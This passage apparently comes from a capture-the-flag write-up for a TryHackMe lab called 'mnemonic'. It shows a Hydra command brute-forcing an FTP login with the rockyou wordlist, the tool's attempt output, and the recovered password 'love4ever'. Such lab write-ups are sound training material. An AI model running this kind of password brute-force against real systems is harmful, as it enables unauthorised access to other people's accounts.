
```sh
┌──(kali㉿kali)-[~/thm/mnemonic]
└─$ hydra -V -t 50 -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://10.10.183.107
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-03-20 10:57:45
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 50 tasks per 1 server, overall 50 tasks, 14344399 login tries (l:1/p:14344399), ~286888 tries per task
[DATA] attacking ftp://10.10.183.107:21/
[ATTEMPT] target 10.10.183.107 - login "ftpuser" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.183.107 - login "ftpuser" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.183.107 - login "ftpuser" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
```

```sh
[ATTEMPT] target 10.10.183.107 - login "ftpuser" - pass "pickles" - 1111 of 14344399 [child 14] (0/0)
[ATTEMPT] target 10.10.183.107 - login "ftpuser" - pass "marco" - 1112 of 14344399 [child 23] (0/0)
[ATTEMPT] target 10.10.183.107 - login "ftpuser" - pass "arnold" - 1113 of 14344399 [child 10] (0/0)
[21][ftp] host: 10.10.183.107   login: ftpuser   password: love4ever
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-03-20 10:59:16

```

We have the ftp password: love4ever